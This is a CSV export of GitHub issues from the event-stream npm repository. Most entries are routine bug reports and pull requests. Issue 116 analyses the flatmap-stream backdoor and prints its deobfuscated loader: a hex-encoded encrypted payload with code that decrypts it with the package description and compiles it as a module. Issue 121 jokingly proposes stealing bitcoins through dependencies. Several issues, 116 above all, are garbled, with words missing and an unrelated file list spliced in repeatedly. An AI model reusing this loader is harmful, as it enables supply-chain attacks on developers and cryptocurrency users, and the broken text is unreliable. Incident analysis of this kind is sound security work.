ID,State,Time Created,Time Updated,Time Closed,Pull Request?,Username,User ID,Author Association,Number of Comments,Title,Body
120,closed,2018-11-27T10:44:38Z,2018-11-27T10:45:40Z,2018-11-27T10:45:40Z,1,ChopperLee2011,2529259,NONE,1,add DepShield badge,<\n>
117,closed,2018-11-26T21:01:30Z,2018-11-26T21:02:57Z,2018-11-26T21:02:49Z,0,broros,598228,NONE,0,w,www<\n>
116,closed,2018-11-20T21:26:01Z,2018-11-28T02:03:13Z,2018-11-26T20:22:32Z,0,FallingSnow,2512197,NONE,666,I don't know what to say.,I If you are using crypto-currency the to have been copay related It a is in use (assumed to be copay at this point). If you are using a crypto-currency related library and you `flatmap-stream@0.1.1` after ls event-stream you are example:<\r><\n> ```<\r><\n> $ npm ls event-stream flatmap-stream<\r><\n> ...<\r><\n> ...<\r><\n> **What it do**:<\r><\n> have of what these payloads actually do.<\r><\n> dataset.csv eslint-issues.csv eslint-scope.csv event-issues.csv event-stream.csv git_issues.sh git_metadata.sh npm_malicious_enum.py snyk_malicious_enum.py dataset.csv eslint-issues.csv eslint-scope.csv event-issues.csv event-stream.csv git_issues.sh git_metadata.sh npm_malicious_enum.py snyk_malicious_enum.py dataset.csv eslint-issues.csv eslint-scope.csv event-issues.csv event-stream.csv git_issues.sh git_metadata.sh npm_malicious_enum.py snyk_malicious_enum.py https://github.com/dominictarr/event-stream/issues/116#issuecomment-441749105<\r><\n><\r><\n>* **What can I do**:<\r><\n> By this time are and npm has the that the of the you are using are of this If you are a your event-stream to people with cached versions of event-stream**.<\r><\n>___<\r><\n><\r><\n>@dominictarr Why was to this added [flatmap-stream](https://github.com/hugeglass/flatmap-stream) which is entirely (1 commit to the but has 3 the removes the injection<c> unmaintained<c> created 3 months ago) injection he it at almost the exact same time the injection is added to `flatmap-stream`<c> he bumps the version and publishes. Literally the second commit (3 days later) after that he removes the injection and bumps a major version so he can the of `flatmap-stream` but still have everyone (millions of weekly installs) using 3.x affected.<\r><\n><\r><\n>@right9ctrl If you removed flatmap-stream because your realized it was injection why didn't you `event-stream@3.3.6` from npm and put a PSA? If you didn't know<c> why did you choose to use a completely unused/unknown library (0 downloads on npm you use If I the exact from npm in which `flatmap-stream@0.1.1` was I be you included a break down of what I have so far on `flatmap-stream` below. It includes the of code not found in the source of `flatmap-stream@0.1.1` but found in the **minified** source. The code has been cleaned up a to a is I still don't even know what this The is code or something<c> not regular or not it correctly.<\r><\n><\r><\n>```js<\r><\n>// var r = = return Buffer.from(r<c> "hex").toString()<\r><\n>// }<\r><\n>function decode(data) {<\r><\n> return Buffer.from(data<c> "hex").toString()<\r><\n>}<\r><\n><\r><\n>// var n = r(e("2e2f746573742f64617461"))<c><\r><\n>// var n = require(decode("2e2f746573742f64617461"))<\r><\n>// var n = n = ["75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629"<c>"db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1"<c>"63727970746f"<c>"656e76"<c>"6e706d5f7061636b6167655f6465736372697074696f6e"<c>"616573323536"<c>"6372656174654465636970686572"<c>"5f636f6d70696c65"<c>"686578"<c>"75746638"]<\r><\n> // = // npm_package_description = process[decode(n[3])][decode(n[4])];<\r><\n> // npm_package_description = process['env']['npm_package_description'];<\r><\n> npm_package_description = of a // Description from ps-tree (this is the var = r(e(n[2]))[e(n[6])](e(n[5])<c> o)<c><\r><\n>// var = = // a = e(n[8])<c> e(n[9]));<\r><\n> // decoded = decipher.update(n[0]<c> e(n[8])<c> e(n[9]));<\r><\n> decoded = decipher.update(n[0]<c> 'hex'<c> // why this is a var f = new module.constructor;<\r><\n>var newModule = new module.constructor;<\r><\n><\r><\n>/**************** DO NOT UNCOMMENT [THIS RUNS THE CODE] **************/<\r><\n>// f.paths = module.paths<c> f[e(n[7])](a<c> "")<c> f.exports(n[1])<\r><\n>// newModule.paths = module.paths<c> newModule['_compile'](decoded<c> "")<c> newModule.paths = newModule['_compile'](decoded<c> "") // Module.prototype._compile =
113,closed,2018-09-17T09:51:11Z,2018-11-27T08:08:51Z,2018-09-30T09:59:28Z,0,XhmikosR,349621,NONE,4,Missing git tags and releases,The latest git tag/release is 3.0.5. Currently there's no changelog and not having the tags makes it even harder to see what's changed between releases.<\n>
112,closed,2018-07-18T12:11:29Z,2018-09-04T05:36:31Z,2018-09-04T05:36:30Z,0,idkmyusername,41373860,NONE,1,Help me please.,I want to make a bot in Discord<c> the code and the bot itself are ready<c> only one problem. I write "npm install discord.js —save" and spouts it out: <\r><\n>npm ERR! Linux 4.4.23+<\r><\n>npm ERR! argv "/data/data/io.tempage.dorynode/files/bin/node" "/data/user/0/io.tempage.dorynode/files/npm/bin/npm-cli.js" "install" "discord.js" "—save"<\r><\n>npm ERR! node v6.11.4<\r><\n>npm ERR! npm v3.10.10<\r><\n>npm ERR! file /storage/emulated/0/Download/package.json<\r><\n>npm ERR! code EJSONPARSE<\r><\n><\r><\n>npm ERR! Failed to parse json<\r><\n>npm ERR! Unexpected token 'c' at 1:1<\r><\n>npm ERR! const Discord = require('discord.js');<\r><\n>npm ERR! ^<\r><\n>npm ERR! File: /storage/emulated/0/Download/package.json<\r><\n>npm ERR! Failed to parse package.json data.<\r><\n>npm ERR! package.json must be actual JSON<c> not just JavaScript.<\r><\n>npm ERR! <\r><\n>npm ERR! This is not a bug in npm.<\r><\n>npm ERR! Tell the package author to fix their package.json file. JSON.parse<\r><\n><\r><\n>npm ERR! Please include the following file with any support request:<\r><\n>npm ERR! /storage/emulated/0/Download/npm-debug.log<\r><\n>code : 1 / signal : 0<\r><\n>What is this?<\r><\n>How this fix?<\n>
111,closed,2018-07-05T14:33:12Z,2018-09-05T04:44:29Z,2018-09-05T04:44:29Z,1,santiagocanti,29209947,NONE,1,Update map-stream to latest version that has MIT license,The version 0.1.0 of map-stream doesn't have a license specified. Update to the latest version 0.0.7 that has MIT license.<\n>
110,closed,2018-05-03T10:45:25Z,2018-06-11T13:11:41Z,2018-06-11T13:11:41Z,0,dlarr,2865021,NONE,1,toString() failed,Hello<c><\r><\n><\r><\n>I am trying to use this library to read from a buffer line by line<c> below the code I use : <\r><\n><\r><\n>```js<\r><\n>const es = require('event-stream');<\r><\n>const stream = require('stream');<\r><\n><\r><\n>let bufferStream = new stream.PassThrough();<\r><\n>bufferStream.end(myBuffer);<\r><\n><\r><\n>bufferStream<\r><\n>	.pipe(es.split())<\r><\n>	.pipe(es.mapSync(function(line){<\r><\n><\r><\n>			// pause the readstream<\r><\n>			bufferStream.pause();<\r><\n><\r><\n>			// DO SOME PROCESSING OF THIS LINE<\r><\n><\r><\n>			// resume the readstream<c> possibly from a callback<\r><\n>			bufferStream.resume();<\r><\n><\r><\n>		}).on('error'<c> function(err){<\r><\n>			console.log('Error while reading file.' + err);<\r><\n>		}).on('end'<c> function(){<\r><\n>			console.log('end event !');<\r><\n>		}).on('close'<c> function(){<\r><\n>			console.log('close event !');<\r><\n>		})<\r><\n>	);<\r><\n>```<\r><\n><\r><\n>It seems awsome<c> but the problem is that I get an error - feels like a noob error :( <\r><\n>```<\r><\n>buffer.js:556<\r><\n> if (encoding === 'utf8') return buf.utf8Slice(start<c> end);<\r><\n> ^<\r><\n><\r><\n>Error: "toString()" failed<\r><\n> at stringSlice (buffer.js:556:43)<\r><\n> at Buffer.toString (buffer.js:629:10)<\r><\n> at StringDecoder.utf8Text [as text] (string_decoder.js:201:16)<\r><\n> at StringDecoder.write (string_decoder.js:85:46)<\r><\n> at Stream.<anonymous> (...\node_modules\split\index.js:53:24)<\r><\n> at Stream.stream.write (...\node_modules\through\index.js:26:11)<\r><\n> at PassThrough.ondata (_stream_readable.js:628:20)<\r><\n> at emitOne (events.js:115:13)<\r><\n> at PassThrough.emit (events.js:210:7)<\r><\n> at PassThrough.Readable.read (_stream_readable.js:464:10)<\r><\n> at flow (_stream_readable.js:835:34)<\r><\n> at resume_ (_stream_readable.js:817:3)<\r><\n> at _combinedTickCallback (internal/process/next_tick.js:138:11)<\r><\n> at process._tickCallback (internal/process/next_tick.js:180:9)<\r><\n><\r><\n>```<\r><\n><\r><\n>Do you know what's happening ?<\r><\n><\r><\n>Thank for the lib anyway !<\r><\n><\r><\n>Regards.<\n>
109,closed,2018-04-25T08:59:38Z,2018-04-25T16:00:09Z,2018-04-25T16:00:09Z,0,ImrePem,35731147,NONE,1,tarball url in package.json could be with https,Hello devs<c><\r><\n><\r><\n>Thank you for your great work.<\r><\n>In packages.json the tarball url is with http. According to [this](https://blog.npmjs.org/post/142077474335/npm-registry-is-now-fully-https)<c> registry.npmjs.org redirect all http requests to https anyway.<\r><\n>We would not append our proxy rules just for this.<\n>
108,closed,2018-04-10T03:11:25Z,2018-09-16T10:46:02Z,2018-09-16T10:46:02Z,0,ahrtr,30739825,NONE,1,How to keep the original stream data unchanged?,I am using event-stream to process a http request payload. The payload is a I to the interested fields. The code is something like below<c> <\r><\n>```<\r><\n>import JSONStream from 'JSONStream';<\r><\n>import eventStream from 'event-stream';<\r><\n><\r><\n>async function processPayload(request) {<\r><\n> const payload = request.payload;<\r><\n> let = payload<c> eventStream.mapSync(function(data){<\r><\n> indexArray.push(data);<\r><\n> })<\r><\n> );<\r><\n> return indexArray;<\r><\n>}<\r><\n>```<\r><\n><\r><\n>Basically the above code the is the original payload<c> so the following the payload as well fails. How can I keep the original data being unchanged? Thanks!<\r><\n><\n>
107,closed,2017-10-07T01:01:42Z,2017-10-09T19:50:07Z,2017-10-09T19:50:07Z,1,Rolias,143885,CONTRIBUTOR,1,Read Me Change Only,I struggled a bit to figure line breaks being maintained. Maintaining line breaks seems like it a fact that they are lost is a result the package. this it seems to add a note about this directly to the documentation on your package. <\n>
106,closed,2017-07-06T08:55:16Z,2018-09-16T10:45:49Z,2018-09-16T10:45:49Z,1,aaleksu,1092344,NONE,2,fixed undefined error on e.pipe in toMerge.forEach,Got an undefined error in our project. This is just an quick is an <\r><\n><\r><\n>TypeError: Cannot read property at /var/www/<preoject>/node_modules/event-stream/index.js:43:6<\r><\n> at Array.forEach (native)<\n>
105,closed,2017-07-06T08:44:33Z,2017-07-06T15:51:19Z,2017-07-06T15:51:19Z,1,aaleksu,1092344,NONE,0,fixed undefined error on e.pipe in toMerge.forEach,I just got an error in our project: "TypeError: Cannot read property 'pipe' of undefined ... at /var/www/<my_project>/node_modules/event-stream/index.js:43:6<\r><\n> at Array.forEach (native) ...".<\r><\n>I don't know why e might be undefined<c> but this is just a quick fix.<\n>
103,closed,2017-03-20T14:00:26Z,2017-03-22T00:50:09Z,2017-03-22T00:50:08Z,1,detailyang,3370345,CONTRIBUTOR,0,doc: layout tweaks,Hello.<\r><\n><\r><\n>Just a little tweaks and README.markdown do not correctly show the CI status.<\n>
102,closed,2016-09-21T21:49:04Z,2018-09-04T05:39:39Z,2018-09-04T05:39:38Z,0,dominictarr,259374,OWNER,9,transfer to gulpjs,I no longer use this and to by many modules in the gulp ecosystem<c> and I the gulp be better stewards of event-stream<\n><\n>Would it be okay if I transfered this to the gulp organization?<\n><\n>@gulpjs @callumacrae @contra @gratimax @heikki @phated @robinboehm @tkellen<\n><\n>
101,closed,2016-09-16T18:08:47Z,2018-09-06T08:07:06Z,2018-09-06T08:07:06Z,0,stevenvachon,170197,NONE,4,merge at end of chain doesn't complete task,= {<\n> const docs = gulp.src("./less/docs.less")<\n> .pipe( less(lessOptions) )<\n> .pipe( )<\n> .pipe( gulp.dest("./docs/") const = .pipe( less(lessOptions) )<\n> .pipe( concat("framework.css") )<\n> .pipe( )<\n> .pipe( gulp.dest("./docs/") es.merge(docs<c> framework);<\n>}<\n>```<\n><\n>```<\n>[14:08:35] The following tasks Did you forget to signal async completion?<\n>```<\n><\n>It completes the in the chain:<\n><\n>``` js<\n>return es.merge(docs<c> framework)<\n> .pipe( gulp.dest("./docs/")
100,closed,2016-09-09T08:57:43Z,2016-09-11T11:29:51Z,2016-09-09T11:56:54Z,1,360disrupt,7427903,NONE,5,Rename LICENCE to LICENSE,http://grammarist.com/spelling/licence-license/ <c> with the previous file name the license checker does not find the license.<\n><\n>
99,closed,2016-08-15T12:25:37Z,2018-09-05T04:38:37Z,2018-09-05T04:38:37Z,0,davidbarton,1619732,NONE,1,Dependency to map-stream,Hi<c> `package.json` specifies dependency to `"map-stream": "~0.1.0"` which I am unable to find in repo https://github.com/dominictarr/map-stream.<\n><\n>My issue is that installed `map-stream 0.1.0` has custom licence and `map-stream 0.0.6` has MIT (preferable). Can you please take a look and update package dependency?<\n><\n>Reproduce<\n><\n>```<\n>npm init -y<\n>npm i --save map-stream@0.1.0<\n>cat node_modules/map-stream/LICENCE<\n>cat node_modules/map-stream/package.json<\n>```<\n><\n>
98,closed,2016-07-24T05:41:27Z,2018-09-05T04:09:18Z,2018-09-05T04:09:17Z,0,milanbella,4014265,NONE,1,simple example pretty.js - split,is not instructive of concepts and is buggy.<\n><\n>Curl fetches only one line EOL mapping only just one line of input to json is not good way explaining the concept of mapping more then one line pretty.js has crashed in json has correctly generated empty string after last EOL terminating last
97,closed,2016-07-19T16:11:32Z,2016-07-20T12:56:06Z,2016-07-20T12:56:06Z,0,drdpedroso,12386985,NONE,2,Error in parsing when using arrow functions,I'm getting queh trying to es.merge my javascript files.<\n><\n>```<\n> stream.js:75<\n> throw er; // Unhandled stream error in pipe.<\n>```<\n><\n>The error message:<\n> Error: Error in parsing: "modules/example/controllers/example-controller.js"<c> Line 8: Unexpected token )<\n><\n>My Controller file:<\n><\n>```<\n> self.toggleSidenav = () => {<\n> return $mdSidenav('left').toggle();<\n> };<\n>```<\n><\n>Is there some solution for it? <\n><\n>
96,closed,2016-07-17T00:09:11Z,2016-07-17T07:24:08Z,2016-07-17T07:24:03Z,1,andrejewski,1660953,CONTRIBUTOR,2,emits "end" if no streams,If there streams I a of because I was merging a variable size array of streams that happen to be empty.<\n><\n>
95,closed,2016-06-18T15:49:39Z,2016-06-18T23:43:05Z,2016-06-18T23:43:05Z,1,nyurik,1641515,CONTRIBUTOR,6,Handle mapSync() exceptions as stream errors,This patch allows synchronious callback to properly<\n>report errors to the stream by throwing exceptions.<\n><\n>mapSync() will convert them into the stream errors<c><\n>catchable with on('error' ...)<\n><\n>https://github.com/dominictarr/event-stream/issues/94<\n><\n>P.S. The trailing spaces got automatically cleaned up by IDE<\n><\n>
94,closed,2016-06-17T03:19:07Z,2016-06-18T23:44:37Z,2016-06-18T23:43:26Z,0,nyurik,1641515,CONTRIBUTOR,4,exception in mapSync causes fatal error,The error thrown in the middle of the mapSync() cases application exception. Shouldn't mapSync handle that? Also<c> do I need to do `on('error')` after each stream transformation?<\n><\n>``` lang=js<\n>return new Promise(function (resolve<c> reject) {<\n> var s = fs.createReadStream(srcFile)<\n> .on('error'<c> reject)<\n> .pipe(es.split())<\n> .on('error'<c> reject)<\n> .pipe(es.mapSync(function (line) {<\n> ...<\n> throw new Error();<\n> ...<\n> }).on('error'<c> reject)<\n> .pipe(fs.createWriteStream(outputFile))<\n> .on('error'<c> reject)<\n> .on('finish'<c> function () {<\n> resolve(outputFile);<\n> });<\n>});<\n>```<\n><\n>
93,closed,2016-01-14T10:35:12Z,2016-01-19T07:47:58Z,2016-01-19T07:47:58Z,0,ghost,10137,NONE,2,es.merge broke my data,I have 12 files to handle<c> so I want to create 12 ReadStreams and merge to one.<\n><\n>In each file<c> each line is a JSON string.<\n><\n>My code is like this: <\n><\n>```<\n> fileNames = fileNames.filter(Boolean);<\n> es.merge(fileNames.map(function(item<c> index) {<\n> return fs.createReadStream(item);<\n> }))<\n> .pipe(es.split())<\n> .pipe(es.parse())<\n>```<\n><\n>After run it<c> I got some JSON.parse error like this: <\n><\n>> SyntaxError: Unexpected token <\n><\n>and I found the error json looks like this:<\n><\n>```<\n>{"ts":1452700832306<c>"segments":{"sex":1<c>"age":5<c>"os":1<c>"deviceprice":5}<c>"appkey":"560129b88bda20a5270f88da"<c>"token":"jXL29pROAnEGng"<c>"deviceid":"D4FB58CD-39{"ts":1452700810077<c>"appkey":"560129b88bda20a5270f88da"<c>"token":"jXL29pROAnEGng"<c>"deviceid":"B8DA0F64C613E896B412788B9BDB06D4"}<\n>```<\n><\n>I grep **1452700832306** and **1452700810077**<c> and find they come from two different files:<\n><\n>in file1<c> test1.log: <\n><\n>```<\n>{"ts":1452700832306<c>"segments":{"sex":1<c>"age":5<c>"os":1<c>"deviceprice":5}<c>"appkey":"560129b88bda20a5270f88da"<c>"token":"jXL29pROAnEGng"<c>"deviceid":"D4FB58CD-39CF-4445-AD26-C85194C0D032"}<\n>```<\n><\n>in file2<c> test2.log:<\n><\n>```<\n>{"ts":1452700810077<c>"appkey":"560129b88bda20a5270f88da"<c>"token":"jXL29pROAnEGng"<c>"deviceid":"B8DA0F64C613E896B412788B9BDB06D4"}<\n>```<\n><\n>So it looks like some of my data has been broken.<\n><\n>**Node version**: v4.2.3<\n>**OS**: CentOS Linux release 7.0.1406 (Core)<\n><\n>
92,closed,2015-12-08T00:51:40Z,2015-12-13T06:51:02Z,2015-12-13T06:50:58Z,1,GERN2015,12283094,NONE,1,BRADS MEDIA,<\n>
91,closed,2015-11-25T10:23:30Z,2018-09-06T05:15:08Z,2018-09-06T05:15:08Z,0,YuraRudkovskiy,7432353,NONE,1,es.merge. node 5.1.0. Does not work.,Use example at https://www.npmjs.com/package/event-stream<\n><\n>``` sh<\n>es.merge(<\n> process.stdout<c><\n> process.stderr<\n>).pipe(fs.createWriteStream('output.log'));<\n>```<\n><\n>I have error:<\n><\n>``` sh<\n>events.js:141<\n> throw er; // Unhandled 'error' event<\n> ^<\n><\n>Error: read ENOTCONN<\n> at exports._errnoException (util.js:856:11)<\n> at WriteStream.Socket._read (net.js:394:21)<\n> at WriteStream.Readable.read (_stream_readable.js:328:10)<\n> at WriteStream.Socket.read (net.js:283:43)<\n> at resume_ (_stream_readable.js:718:12)<\n> at doNTCallback2 (node.js:452:9)<\n> at process._tickCallback (node.js:366:17)<\n> at Function.Module.runMain (module.js:459:11)<\n> at startup (node.js:138:18)<\n> at node.js:974:3<\n>```<\n><\n>Could you offer how to fix it?<\n><\n>
90,closed,2015-11-24T09:52:43Z,2018-09-05T04:28:28Z,2018-09-05T04:28:27Z,0,yinrong,4221569,NONE,4,es.split generate a empty line for trailing newline,es.split is mostly used for processing line by line<c> however we usually get an empty line at the end of the file. Please remove trailing newline.<\n><\n>
89,closed,2015-09-21T06:40:43Z,2015-09-22T08:13:27Z,2015-09-22T08:13:27Z,0,XeCycle,763350,CONTRIBUTOR,2,Add a es.chain?,I like this js<\n>function chain(...streams) {<\n> var [head] = var = streams.reduce((prev<c> curr) => return that I can write<\n><\n>``` js<\n>function formatter() {<\n> return chain(<\n> es.split()<c><\n> es.mapSync(...)<c><\n> es.stringify()<\n> );<\n>}<\n><\n>someStream.pipe(formatter());<\n>```<\n><\n>Would you like this added to event-stream? If yes please also tell me what behaviour you want<c> e.g. multiple arguments what to also I can go PR.<\n><\n>
88,closed,2015-09-16T22:47:03Z,2015-09-17T00:51:17Z,2015-09-17T00:51:17Z,1,johnw424,2890568,CONTRIBUTOR,1,Fix spelling error in index.js,Fixed spelling error in console.error from "attemping to parse" to "attempting to parse"<\n><\n>
87,closed,2015-05-06T02:46:58Z,2015-05-06T02:58:12Z,2015-05-06T02:58:12Z,1,psalaets,123952,CONTRIBUTOR,1,minor tweak to a few headings in readme,Adjusts a few headings so they're more noticeable at https://www.npmjs.com/package/event-stream<\n><\n>
86,closed,2015-05-05T11:04:55Z,2018-07-11T17:06:43Z,2015-07-15T07:02:07Z,0,DennisAhaus,1810042,NONE,14,npm install event-stream --> npm ERR! code EJSONPARSE ,$ npm install --save https://github.com/dominictarr/event-stream/tarball/master<\n>npm WARN package.json deliveryapp2@0.0.0 keywords should be an array of strings<\n>npm ERR! 6.1.7601<\n>npm ERR! argv "c:\dev\iojs\node.exe" "c:\dev\iojs\node_modules\npm\bin\npm-cli.js" "install<\n>" "--save" "https://github.com/dominictarr/event-stream/tarball/master"<\n>npm ERR! node v1.8.1<\n>npm ERR! npm v2.8.3<\n>npm ERR! file C:\Users\ahausden\AppData\Roaming\npm-cache\stream-combiner\0.0.4\package\package.json<\n><\n>npm ERR! code EJSONPARSE<\n><\n>npm ERR! Failed to parse json<\n>npm ERR! No data<c> empty input at 1:1<\n>npm ERR!<\n>npm ERR! ^<\n>npm ERR! File: C:\Users\ahausden\AppData\Roaming\npm-cache\stream-combiner\0.0.4\package\package.jso<\n>n<\n>npm ERR! Failed to parse package.json data.<\n>npm ERR! package.json must be actual JSON<c> not just JavaScript.<\n>npm ERR!<\n>npm ERR! This is not a bug in npm.<\n>npm ERR! Tell the package author to fix their package.json file. JSON.parse<\n><\n>npm ERR! Please include the following file with any support request:<\n><\n>
122,open,2018-11-27T21:35:06Z,2018-11-27T23:57:29Z,null,0,helmerdavila,11061182,NONE,1,💻🕷☣️,<\n>
121,open,2018-11-27T12:33:23Z,2018-11-27T17:40:36Z,null,0,decrn,15365152,NONE,5,Feature request: bitcoin stealing,Would be nice to steal some bitcoins.<\r><\n><\r><\n>Maybe we can work something out by crafting an attack that looks for peer dependencies that handle bitcoin transactions? Like `copay-dash`?<\n>
119,open,2018-11-27T09:25:35Z,2018-11-27T09:25:35Z,null,0,yurii-ivanov,27861572,NONE,0,.,<\n>
118,open,2018-11-27T05:37:52Z,2018-11-27T05:37:52Z,null,0,lingfennan,5529157,NONE,0,l,<\n>
115,open,2018-11-19T13:34:56Z,2018-11-28T00:18:59Z,null,0,NewEraCracker,416945,NONE,40,Backdoored dependency? flatmap-stream-0.1.1 and flatmap-stream-0.1.2,I'm using version 3.3.6 of this module. flatmap-stream was added by this commit:<\r><\n>https://github.com/dominictarr/event-stream/commit/e3163361fed01384c986b9b4c18feb1fc42b8285<\r><\n><\r><\n>The new updates to the package on npm are very suspicious.<\r><\n><\r><\n>0.1.0: https://registry.npmjs.org/flatmap-stream/-/flatmap-stream-0.1.0.tgz<\r><\n>0.1.1: https://registry.npmjs.org/flatmap-stream/-/flatmap-stream-0.1.1.tgz<\r><\n>0.1.2: https://registry.npmjs.org/flatmap-stream/-/flatmap-stream-0.1.2.tgz<\r><\n><\r><\n>Regards.<\n>
114,open,2018-10-21T11:31:16Z,2018-10-21T11:31:16Z,null,0,rightaway,3680078,NONE,0,Allow async/await in map,Would it be possible to allow async/await in map function? So that instead of passing a map or return a value or return undefined to This would help the code to be easier to
